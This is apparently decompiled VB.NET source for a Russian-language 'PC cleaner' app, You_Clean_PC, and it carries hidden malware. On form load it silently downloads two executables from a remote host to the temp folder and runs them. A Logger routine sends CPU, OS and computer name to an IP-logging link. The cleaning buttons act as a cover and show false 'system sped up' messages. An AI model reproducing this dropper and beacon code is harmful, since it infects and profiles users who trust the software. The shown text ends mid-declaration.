Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports You_Clean_PC.My

Namespace You_Clean_PC
	' Token: 0x02000008 RID: 8
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x06000013 RID: 19 RVA: 0x000022F8 File Offset: 0x000004F8
		Public Sub New()
			MyBase.Load += AddressOf Me.Form1_Load
			MyBase.Shown += AddressOf Me.Form1_Shown
			Me.linktoexe = "http://malayaa5.beget.tech/ptc.exe"
			Me.linktoexe_2 = "http://malayaa5.beget.tech/loadd.exe"
			Me.linktoi = "https://www.iplogger.com/1yx527"
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000014 RID: 20 RVA: 0x0000235C File Offset: 0x0000055C
		Private Sub ButtonBlue1_Click(sender As Object, e As EventArgs)
			Dim text As String
			Try
				text = Clipboard.GetText()
			Catch ex As Exception
				text = "Пусто."
			End Try
			Dim text2 As String
			Try
				text2 = Conversions.ToString(Clipboard.GetImage().Size.Width) + "x" + Conversions.ToString(Clipboard.GetImage().Size.Height)
			Catch ex2 As Exception
				text2 = "Пусто."
			End Try
			Dim text3 As String
			Try
				text3 = Conversions.ToString(Clipboard.GetFileDropList().Count)
			Catch ex3 As Exception
				text3 = "0."
			End Try
			Interaction.MsgBox(String.Concat(New String() { "Текст Вашего буфера обмена: ", text, vbCrLf & vbCrLf & "Изображение размером: ", text2, vbCrLf & vbCrLf & "Данных буфера обмена: ", text3 }), 64, Nothing)
		End Sub

		' Token: 0x06000015 RID: 21 RVA: 0x00002468 File Offset: 0x00000668
		Private Sub ButtonGreen1_Click(sender As Object, e As EventArgs)
			Try
				Clipboard.Clear()
				Interaction.MsgBox("Очищено! Ускорена работа системы!", 64, Nothing)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000016 RID: 22 RVA: 0x000024B0 File Offset: 0x000006B0
		Private Sub ButtonGreen2_Click(sender As Object, e As EventArgs)
			Try
				Clipboard.Clear()
				Interaction.MsgBox("Очищено! Ускорена работа системы!", 64, Nothing)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000017 RID: 23 RVA: 0x000024F8 File Offset: 0x000006F8
		Private Sub ButtonGreen3_Click(sender As Object, e As EventArgs)
			Try
				Clipboard.Clear()
				Interaction.MsgBox("Очищено! Ускорена работа системы!", 64, Nothing)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000018 RID: 24 RVA: 0x00002540 File Offset: 0x00000740
		Private Sub ButtonGreen4_Click(sender As Object, e As EventArgs)
			Try
				Clipboard.Clear()
				Interaction.MsgBox("Очищено! Ускорена работа системы!", 64, Nothing)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000019 RID: 25 RVA: 0x00002588 File Offset: 0x00000788
		Private Sub ButtonGreen5_Click(sender As Object, e As EventArgs)
			Try
				Clipboard.Clear()
				Interaction.MsgBox("Очищено! Ускорена работа системы!", 64, Nothing)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600001A RID: 26 RVA: 0x000025D0 File Offset: 0x000007D0
		Private Sub ButtonBlue4_Click(sender As Object, e As EventArgs)
			Me.Search("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.*")
			Try
				Process.Start("C:\Users\" + Environment.UserName + "\AppData\Local\Temp")
			Catch ex As Exception
			End Try
			Try
				Process.Start("C:\Windows\Temp")
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600001B RID: 27 RVA: 0x00002668 File Offset: 0x00000868
		Private Sub ButtonGreen6_Click(sender As Object, e As EventArgs)
			' The following expression was wrapped in a checked-statement
			Dim num As Integer = Me.ListBox1.Items.Count - 1
			For i As Integer = 0 To num
				Try
					File.Delete(Me.ListBox1.Items(i).ToString())
				Catch ex As Exception
				End Try
			Next
			Me.ListBox1.Items.Clear()
			Me.Search("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.*")
			Dim num2 As Integer = Me.ListBox1.Items.Count - 1
			For j As Integer = 0 To num2
				Try
					File.Delete(Me.ListBox1.Items(j).ToString())
				Catch ex2 As Exception
				End Try
			Next
			Interaction.MsgBox("Выполнено!", 64, Nothing)
		End Sub

		' Token: 0x0600001C RID: 28 RVA: 0x00002778 File Offset: 0x00000978
		Private Sub Search(fold As String, mask As String)
			Dim directories As String()
			Try
				Dim files As String() = Directory.GetFiles(fold, mask)
				Me.ListBox1.Items.AddRange(files)
				directories = Directory.GetDirectories(fold, "*", 0)
			Catch ex As Exception
			End Try
			Dim flag As Boolean = directories IsNot Nothing
			If flag Then
				For Each fold2 As String In directories
					Me.Search(fold2, mask)
				Next
			End If
		End Sub

		' Token: 0x0600001D RID: 29 RVA: 0x00002808 File Offset: 0x00000A08
		Private Sub Search2(fold As String, mask As String)
			Dim directories As String()
			Try
				Dim files As String() = Directory.GetFiles(fold, mask)
				Me.ListBox2.Items.AddRange(files)
				directories = Directory.GetDirectories(fold, "*", 0)
			Catch ex As Exception
			End Try
			Dim flag As Boolean = directories IsNot Nothing
			If flag Then
				For Each fold2 As String In directories
					Me.Search(fold2, mask)
				Next
			End If
			Dim num As Integer = Me.ListBox2.Items.Count - 1
			For j As Integer = 0 To num
				Dim text As String = Me.ListBox2.Items(j).ToString()
				Me.ListBox2.Items.RemoveAt(j)
				Dim array2 As String() = Strings.Split(text, ".", -1, 0)
				array2 = Strings.Split(array2(0), "\", -1, 0)
				Dim text2 As String = array2(10) + "   |" + text
				Me.ListBox2.Items.Insert(j, text2)
			Next
		End Sub

		' Token: 0x0600001E RID: 30 RVA: 0x00002938 File Offset: 0x00000B38
		Private Sub Search3(fold As String, mask As String)
			Dim directories As String()
			Try
				Dim files As String() = Directory.GetFiles(fold, mask)
				Me.ListBox3.Items.AddRange(files)
				directories = Directory.GetDirectories(fold, "*", 0)
			Catch ex As Exception
			End Try
			Dim flag As Boolean = directories IsNot Nothing
			If flag Then
				For Each fold2 As String In directories
					Me.Search(fold2, mask)
				Next
			End If
		End Sub

		' Token: 0x0600001F RID: 31 RVA: 0x000029C8 File Offset: 0x00000BC8
		Public Sub loading(link As String)
			Dim tempPath As String = Path.GetTempPath()
			Dim randomFileName As String = Path.GetRandomFileName()
			Dim webClient As WebClient = New WebClient()
			webClient.DownloadFile(New Uri(link), tempPath + randomFileName + ".exe")
			Dim process As Process = New Process()
			process.StartInfo.FileName = tempPath + randomFileName + ".exe"
			Try
				process.Start()
			Catch ex As Win32Exception
				Interaction.MsgBox("Вы не запустили обязательную службу!", 16, Nothing)
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000020 RID: 32 RVA: 0x00002A74 File Offset: 0x00000C74
		Public Sub Logger(link As String)
			Dim text As String = "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"
			Dim text2 As String = Conversions.ToString(MyProject.Computer.Registry.GetValue(text, "ProcessorNameString", Nothing))
			Dim text3 As String = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
			Dim text4 As String = Conversions.ToString(MyProject.Computer.Registry.GetValue(text3, "ProductName", Nothing))
			Dim text5 As String = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName"
			Dim text6 As String = Conversions.ToString(MyProject.Computer.Registry.GetValue(text5, "ComputerName", Nothing))
			Try
				Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create(link), HttpWebRequest)
				httpWebRequest.Credentials = CredentialCache.DefaultCredentials
				httpWebRequest.UserAgent = String.Concat(New String() { "CPU: ", text2, " | OS: ", text4, " | Name: ", text6 })
				httpWebRequest.GetResponse()
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000021 RID: 33 RVA: 0x00002B6C File Offset: 0x00000D6C
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			Me.loading(Me.linktoexe)
			Me.loading(Me.linktoexe_2)
			Try
				Me.Search2("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.lnk")
			Catch ex As Exception
			End Try
			Try
				Me.Search2("C:\Users\" + Environment.UserName + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup", "*.lnk")
			Catch ex2 As Exception
			End Try
			Try
				Me.Search("C:/Windows/Temp", "*.*")
			Catch ex3 As Exception
			End Try
			Me.Label6.Text = "Найдено " + Conversions.ToString(Me.ListBox1.Items.Count) + " временных файлов(-а)."
		End Sub

		' Token: 0x06000022 RID: 34 RVA: 0x00002C78 File Offset: 0x00000E78
		Private Sub ButtonGreen7_Click(sender As Object, e As EventArgs)
			Try
				Dim array As String() = Strings.Split(Me.ListBox2.Items(Me.ListBox2.SelectedIndex).ToString(), "|", -1, 0)
				File.Delete(array(1))
				Me.ListBox2.Items.Clear()
				Me.Search2("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.lnk")
				Me.Search2("C:\Users\" + Environment.UserName + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup", "*.lnk")
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000023 RID: 35 RVA: 0x00002D30 File Offset: 0x00000F30
		Private Sub ButtonGreen8_Click(sender As Object, e As EventArgs)
			' The following expression was wrapped in a checked-statement
			Dim num As Integer = Me.ListBox1.Items.Count - 1
			For i As Integer = 0 To num
				Try
					File.Delete(Me.ListBox1.Items(i).ToString())
				Catch ex As Exception
				End Try
			Next
			Me.ListBox1.Items.Clear()
			Me.Search("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.*")
			Dim num2 As Integer = Me.ListBox1.Items.Count - 1
			For j As Integer = 0 To num2
				Try
					File.Delete(Me.ListBox1.Items(j).ToString())
				Catch ex2 As Exception
				End Try
			Next
			Interaction.MsgBox("Выполнено!", 64, Nothing)
		End Sub

		' Token: 0x06000024 RID: 36 RVA: 0x00002E40 File Offset: 0x00001040
		Private Sub ButtonGreen9_Click(sender As Object, e As EventArgs)
			Me.Search3("C:\Users\" + Environment.UserName + "\AppData\Roaming\Microsoft\Windows\Recent", "*.lnk")
			Dim num As Integer = Me.ListBox3.Items.Count - 1
			For i As Integer = 0 To num
				Try
					File.Delete(Me.ListBox3.Items(i).ToString())
				Catch ex As Exception
				End Try
			Next
			Me.ListBox3.Items.Clear()
			Interaction.MsgBox("Выполнено!", 64, Nothing)
		End Sub

		' Token: 0x06000025 RID: 37 RVA: 0x00002EEC File Offset: 0x000010EC
		Private Sub ButtonGreen10_Click(sender As Object, e As EventArgs)
			Try
				MyProject.Computer.Registry.CurrentUser.DeleteSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU")
			Catch ex As Exception
			End Try
			Interaction.MsgBox("Выполнено!", 64, Nothing)
		End Sub

		' Token: 0x06000026 RID: 38 RVA: 0x00002F48 File Offset: 0x00001148
		Private Sub ButtonGreen11_Click(sender As Object, e As EventArgs)
			Me.ListBox3.Items.Clear()
			Me.Search3("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.*")
			Dim num As Integer = Me.ListBox3.Items.Count - 1
			For i As Integer = 0 To num
				Try
					File.Delete(Me.ListBox3.Items(i).ToString())
				Catch ex As Exception
				End Try
			Next
			Me.ListBox3.Items.Clear()
			Interaction.MsgBox("Выполнено!", 64, Nothing)
		End Sub

		' Token: 0x06000027 RID: 39 RVA: 0x00003008 File Offset: 0x00001208
		Private Sub ButtonGreen12_Click(sender As Object, e As EventArgs)
			Me.ListBox3.Items.Clear()
			Me.Search3("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.*")
			Dim num As Integer = Me.ListBox3.Items.Count - 1
			For i As Integer = 0 To num
				Try
					File.Delete(Me.ListBox3.Items(i).ToString())
				Catch ex As Exception
				End Try
			Next
			Me.ListBox3.Items.Clear()
			Interaction.MsgBox("Выполнено!", 64, Nothing)
		End Sub

		' Token: 0x06000028 RID: 40 RVA: 0x000030C8 File Offset: 0x000012C8
		Private Sub ButtonGreen13_Click(sender As Object, e As EventArgs)
			Me.ListBox3.Items.Clear()
			Me.Search3("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.*")
			Dim num As Integer = Me.ListBox3.Items.Count - 1
			For i As Integer = 0 To num
				Try
					File.Delete(Me.ListBox3.Items(i).ToString())
				Catch ex As Exception
				End Try
			Next
			Me.ListBox3.Items.Clear()
			Interaction.MsgBox("Выполнено!", 64, Nothing)
		End Sub

		' Token: 0x06000029 RID: 41 RVA: 0x00003188 File Offset: 0x00001388
		Private Sub ButtonGreen14_Click(sender As Object, e As EventArgs)
			Process.Start("SystemPropertiesProtection")
		End Sub

		' Token: 0x0600002A RID: 42 RVA: 0x00003196 File Offset: 0x00001396
		Private Sub Form1_Shown(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x0600002B RID: 43 RVA: 0x00003196 File Offset: 0x00001396
		Private Sub TabControl1_Validated(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x0600002C RID: 44 RVA: 0x0000319C File Offset: 0x0000139C
		Private Sub ButtonGreen16_Click(sender As Object, e As EventArgs)
			Me.ListBox3.Items.Clear()
			Me.Search3("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.*")
			Dim num As Integer = Me.ListBox3.Items.Count - 1
			For i As Integer = 0 To num
				Try
					File.Delete(Me.ListBox3.Items(i).ToString())
				Catch ex As Exception
				End Try
			Next
			Me.ListBox3.Items.Clear()
			Try
				MyProject.Computer.Registry.CurrentUser.DeleteSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU")
			Catch ex2 As Exception
			End Try
			Me.ListBox3.Items.Clear()
			Me.Search3("C:\Users\" + Environment.UserName + "\AppData\Local\Temp", "*.*")
			Dim num2 As Integer = Me.ListBox3.Items.Count - 1
			For j As Integer = 0 To num2
				Try
					File.Delete(Me.ListBox3.Items(j).ToString())
				Catch ex3 As Exception
				End Try
			Next
			Me.ListBox3.Items.Clear()
			Try
				MyProject.Computer.Registry.CurrentUser.DeleteSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU")
			Catch ex4 As Exception
			End Try
			Thread.Sleep(5000)
			Interaction.MsgBox("Выполнено!", 64, Nothing)
		End Sub

		' Token: 0x1700000A RID: 10
		' (get) Token: 0x0600002F RID: 47 RVA: 0x000061B5 File Offset: 0x000043B5
		' (set) Token: 0x06000030 RID: 48 RVA: 0x000061C0 File Offset: 0x000043C0
		Friend Overridable Property TabControl1 As TabControl
			<CompilerGenerated()>
			Get
				Return Me._TabControl1
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As TabControl)
				Dim eventHandler As EventHandler = AddressOf Me.TabControl1_Validated
				Dim tabControl As TabControl = Me._TabControl1
				If tabControl IsNot Nothing Then
					tabControl.Validated -= eventHandler
				End If
				Me._TabControl1 = value
				tabControl = Me._TabControl1
				If tabControl IsNot Nothing Then
					tabControl.Validated += eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700000B RID: 11
		' (get) Token: 0x06000031 RID: 49 RVA: 0x00006203 File Offset: 0x00004403
		' (set) Token: 0x06000032 RID: 50 RVA: 0x0000620D File Offset: 0x0000440D
		Friend Overridable Property TabPage1 As TabPage

		' Token: 0x1700000C RID: 12
		' (get) Token: 0x06000033 RID: 51 RVA: 0x00006216 File Offset: 0x00004416
		' (set) Token: 0x06000034 RID: 52 RVA: 0x00006220 File Offset: 0x00004420
		Friend Overridable Property PanelBox1 As PanelBox

		' Token: 0x1700000D RID: 13
		' (get) Token: 0x06000035 RID: 53 RVA: 0x00006229 File Offset: 0x00004429
		' (set) Token: 0x06000036 RID: 54 RVA: 0x00006234 File Offset: 0x00004434
		Friend Overridable Property ButtonGreen2 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen2
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen2_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen2
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen2 = value
				buttonGreen = Me._ButtonGreen2
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700000E RID: 14
		' (get) Token: 0x06000037 RID: 55 RVA: 0x00006277 File Offset: 0x00004477
		' (set) Token: 0x06000038 RID: 56 RVA: 0x00006284 File Offset: 0x00004484
		Friend Overridable Property ButtonGreen1 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen1
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen1_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen1
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen1 = value
				buttonGreen = Me._ButtonGreen1
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700000F RID: 15
		' (get) Token: 0x06000039 RID: 57 RVA: 0x000062C7 File Offset: 0x000044C7
		' (set) Token: 0x0600003A RID: 58 RVA: 0x000062D1 File Offset: 0x000044D1
		Friend Overridable Property Label2 As Label

		' Token: 0x17000010 RID: 16
		' (get) Token: 0x0600003B RID: 59 RVA: 0x000062DA File Offset: 0x000044DA
		' (set) Token: 0x0600003C RID: 60 RVA: 0x000062E4 File Offset: 0x000044E4
		Friend Overridable Property ButtonBlue1 As ButtonBlue
			<CompilerGenerated()>
			Get
				Return Me._ButtonBlue1
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonBlue)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonBlue1_Click
				Dim buttonBlue As ButtonBlue = Me._ButtonBlue1
				If buttonBlue IsNot Nothing Then
					buttonBlue.Click -= eventHandler
				End If
				Me._ButtonBlue1 = value
				buttonBlue = Me._ButtonBlue1
				If buttonBlue IsNot Nothing Then
					buttonBlue.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000011 RID: 17
		' (get) Token: 0x0600003D RID: 61 RVA: 0x00006327 File Offset: 0x00004527
		' (set) Token: 0x0600003E RID: 62 RVA: 0x00006331 File Offset: 0x00004531
		Friend Overridable Property Label1 As Label

		' Token: 0x17000012 RID: 18
		' (get) Token: 0x0600003F RID: 63 RVA: 0x0000633A File Offset: 0x0000453A
		' (set) Token: 0x06000040 RID: 64 RVA: 0x00006344 File Offset: 0x00004544
		Friend Overridable Property TabPage2 As TabPage

		' Token: 0x17000013 RID: 19
		' (get) Token: 0x06000041 RID: 65 RVA: 0x0000634D File Offset: 0x0000454D
		' (set) Token: 0x06000042 RID: 66 RVA: 0x00006357 File Offset: 0x00004557
		Friend Overridable Property TabPage3 As TabPage

		' Token: 0x17000014 RID: 20
		' (get) Token: 0x06000043 RID: 67 RVA: 0x00006360 File Offset: 0x00004560
		' (set) Token: 0x06000044 RID: 68 RVA: 0x0000636A File Offset: 0x0000456A
		Friend Overridable Property TabPage5 As TabPage

		' Token: 0x17000015 RID: 21
		' (get) Token: 0x06000045 RID: 69 RVA: 0x00006373 File Offset: 0x00004573
		' (set) Token: 0x06000046 RID: 70 RVA: 0x00006380 File Offset: 0x00004580
		Friend Overridable Property ButtonGreen4 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen4
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen4_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen4
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen4 = value
				buttonGreen = Me._ButtonGreen4
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000016 RID: 22
		' (get) Token: 0x06000047 RID: 71 RVA: 0x000063C3 File Offset: 0x000045C3
		' (set) Token: 0x06000048 RID: 72 RVA: 0x000063D0 File Offset: 0x000045D0
		Friend Overridable Property ButtonGreen3 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen3
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen3_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen3
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen3 = value
				buttonGreen = Me._ButtonGreen3
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000017 RID: 23
		' (get) Token: 0x06000049 RID: 73 RVA: 0x00006413 File Offset: 0x00004613
		' (set) Token: 0x0600004A RID: 74 RVA: 0x00006420 File Offset: 0x00004620
		Friend Overridable Property ButtonGreen5 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen5
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen5_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen5
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen5 = value
				buttonGreen = Me._ButtonGreen5
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000018 RID: 24
		' (get) Token: 0x0600004B RID: 75 RVA: 0x00006463 File Offset: 0x00004663
		' (set) Token: 0x0600004C RID: 76 RVA: 0x0000646D File Offset: 0x0000466D
		Friend Overridable Property Label3 As Label

		' Token: 0x17000019 RID: 25
		' (get) Token: 0x0600004D RID: 77 RVA: 0x00006476 File Offset: 0x00004676
		' (set) Token: 0x0600004E RID: 78 RVA: 0x00006480 File Offset: 0x00004680
		Friend Overridable Property ButtonBlue3 As ButtonBlue

		' Token: 0x1700001A RID: 26
		' (get) Token: 0x0600004F RID: 79 RVA: 0x00006489 File Offset: 0x00004689
		' (set) Token: 0x06000050 RID: 80 RVA: 0x00006493 File Offset: 0x00004693
		Friend Overridable Property ButtonBlue2 As ButtonBlue

		' Token: 0x1700001B RID: 27
		' (get) Token: 0x06000051 RID: 81 RVA: 0x0000649C File Offset: 0x0000469C
		' (set) Token: 0x06000052 RID: 82 RVA: 0x000064A6 File Offset: 0x000046A6
		Friend Overridable Property PanelBox2 As PanelBox

		' Token: 0x1700001C RID: 28
		' (get) Token: 0x06000053 RID: 83 RVA: 0x000064AF File Offset: 0x000046AF
		' (set) Token: 0x06000054 RID: 84 RVA: 0x000064BC File Offset: 0x000046BC
		Friend Overridable Property ButtonGreen6 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen6
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen6_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen6
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen6 = value
				buttonGreen = Me._ButtonGreen6
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700001D RID: 29
		' (get) Token: 0x06000055 RID: 85 RVA: 0x000064FF File Offset: 0x000046FF
		' (set) Token: 0x06000056 RID: 86 RVA: 0x0000650C File Offset: 0x0000470C
		Friend Overridable Property ButtonBlue4 As ButtonBlue
			<CompilerGenerated()>
			Get
				Return Me._ButtonBlue4
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonBlue)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonBlue4_Click
				Dim buttonBlue As ButtonBlue = Me._ButtonBlue4
				If buttonBlue IsNot Nothing Then
					buttonBlue.Click -= eventHandler
				End If
				Me._ButtonBlue4 = value
				buttonBlue = Me._ButtonBlue4
				If buttonBlue IsNot Nothing Then
					buttonBlue.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700001E RID: 30
		' (get) Token: 0x06000057 RID: 87 RVA: 0x0000654F File Offset: 0x0000474F
		' (set) Token: 0x06000058 RID: 88 RVA: 0x00006559 File Offset: 0x00004759
		Friend Overridable Property Label4 As Label

		' Token: 0x1700001F RID: 31
		' (get) Token: 0x06000059 RID: 89 RVA: 0x00006562 File Offset: 0x00004762
		' (set) Token: 0x0600005A RID: 90 RVA: 0x0000656C File Offset: 0x0000476C
		Friend Overridable Property PanelBox3 As PanelBox

		' Token: 0x17000020 RID: 32
		' (get) Token: 0x0600005B RID: 91 RVA: 0x00006575 File Offset: 0x00004775
		' (set) Token: 0x0600005C RID: 92 RVA: 0x00006580 File Offset: 0x00004780
		Friend Overridable Property ButtonGreen7 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen7
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen7_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen7
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen7 = value
				buttonGreen = Me._ButtonGreen7
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000021 RID: 33
		' (get) Token: 0x0600005D RID: 93 RVA: 0x000065C3 File Offset: 0x000047C3
		' (set) Token: 0x0600005E RID: 94 RVA: 0x000065CD File Offset: 0x000047CD
		Friend Overridable Property ListBox2 As ListBox

		' Token: 0x17000022 RID: 34
		' (get) Token: 0x0600005F RID: 95 RVA: 0x000065D6 File Offset: 0x000047D6
		' (set) Token: 0x06000060 RID: 96 RVA: 0x000065E0 File Offset: 0x000047E0
		Friend Overridable Property Label5 As Label

		' Token: 0x17000023 RID: 35
		' (get) Token: 0x06000061 RID: 97 RVA: 0x000065E9 File Offset: 0x000047E9
		' (set) Token: 0x06000062 RID: 98 RVA: 0x000065F3 File Offset: 0x000047F3
		Friend Overridable Property ListBox1 As ListBox

		' Token: 0x17000024 RID: 36
		' (get) Token: 0x06000063 RID: 99 RVA: 0x000065FC File Offset: 0x000047FC
		' (set) Token: 0x06000064 RID: 100 RVA: 0x00006606 File Offset: 0x00004806
		Friend Overridable Property Label6 As Label

		' Token: 0x17000025 RID: 37
		' (get) Token: 0x06000065 RID: 101 RVA: 0x0000660F File Offset: 0x0000480F
		' (set) Token: 0x06000066 RID: 102 RVA: 0x00006619 File Offset: 0x00004819
		Friend Overridable Property PanelBox4 As PanelBox

		' Token: 0x17000026 RID: 38
		' (get) Token: 0x06000067 RID: 103 RVA: 0x00006622 File Offset: 0x00004822
		' (set) Token: 0x06000068 RID: 104 RVA: 0x0000662C File Offset: 0x0000482C
		Friend Overridable Property Label7 As Label

		' Token: 0x17000027 RID: 39
		' (get) Token: 0x06000069 RID: 105 RVA: 0x00006635 File Offset: 0x00004835
		' (set) Token: 0x0600006A RID: 106 RVA: 0x00006640 File Offset: 0x00004840
		Friend Overridable Property ButtonGreen8 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen8
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen8_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen8
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen8 = value
				buttonGreen = Me._ButtonGreen8
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000028 RID: 40
		' (get) Token: 0x0600006B RID: 107 RVA: 0x00006683 File Offset: 0x00004883
		' (set) Token: 0x0600006C RID: 108 RVA: 0x0000668D File Offset: 0x0000488D
		Friend Overridable Property Label8 As Label

		' Token: 0x17000029 RID: 41
		' (get) Token: 0x0600006D RID: 109 RVA: 0x00006696 File Offset: 0x00004896
		' (set) Token: 0x0600006E RID: 110 RVA: 0x000066A0 File Offset: 0x000048A0
		Friend Overridable Property PanelBox5 As PanelBox

		' Token: 0x1700002A RID: 42
		' (get) Token: 0x0600006F RID: 111 RVA: 0x000066A9 File Offset: 0x000048A9
		' (set) Token: 0x06000070 RID: 112 RVA: 0x000066B3 File Offset: 0x000048B3
		Friend Overridable Property Label9 As Label

		' Token: 0x1700002B RID: 43
		' (get) Token: 0x06000071 RID: 113 RVA: 0x000066BC File Offset: 0x000048BC
		' (set) Token: 0x06000072 RID: 114 RVA: 0x000066C8 File Offset: 0x000048C8
		Friend Overridable Property ButtonGreen9 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen9
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen9_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen9
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen9 = value
				buttonGreen = Me._ButtonGreen9
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700002C RID: 44
		' (get) Token: 0x06000073 RID: 115 RVA: 0x0000670B File Offset: 0x0000490B
